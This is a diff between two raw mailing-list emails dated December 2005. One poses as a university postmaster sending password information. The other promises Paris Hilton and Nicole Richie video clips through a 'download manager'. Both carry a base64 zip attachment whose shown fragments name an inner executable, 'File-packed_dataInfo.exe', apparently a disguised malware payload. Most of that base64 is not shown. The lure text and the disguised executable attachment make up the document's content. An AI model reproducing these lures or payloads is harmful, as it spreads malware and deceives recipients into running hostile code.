@@ -1,29 +1,30 @@
-From: postman@ecs.soton.ac.uk
-Subject: Your Password
-Date: Wed, 14 Dec 2005 13:05:23 UTC
-Message-ID: <d1b50cf22fec.e052@ecs.soton.ac.uk>
+From: office@web.de
+Subject: Paris Hilton & Nicole Richie
+Date: Wed, 14 Dec 2005 13:35:33 UTC
+Message-ID: <3d6a.c5105bef3adfc@web.de>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="====86ac32.d83151fc0ff2b"
+Content-Type: multipart/mixed; boundary="=4831f7aaf.cbf058a70081a"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: Z-User@oss.sgi.com
+To: xfs-masters@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---====86ac32.d83151fc0ff2b
+--=4831f7aaf.cbf058a70081a
 
-Account and Password Information are attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.ecs.soton.ac.uk
-***** Email: postman@ecs.soton.ac.uk
---====86ac32.d83151fc0ff2b
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+Please use our Download manager.
+--=4831f7aaf.cbf058a70081a
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---====86ac32.d83151fc0ff2b--
+--=4831f7aaf.cbf058a70081a--
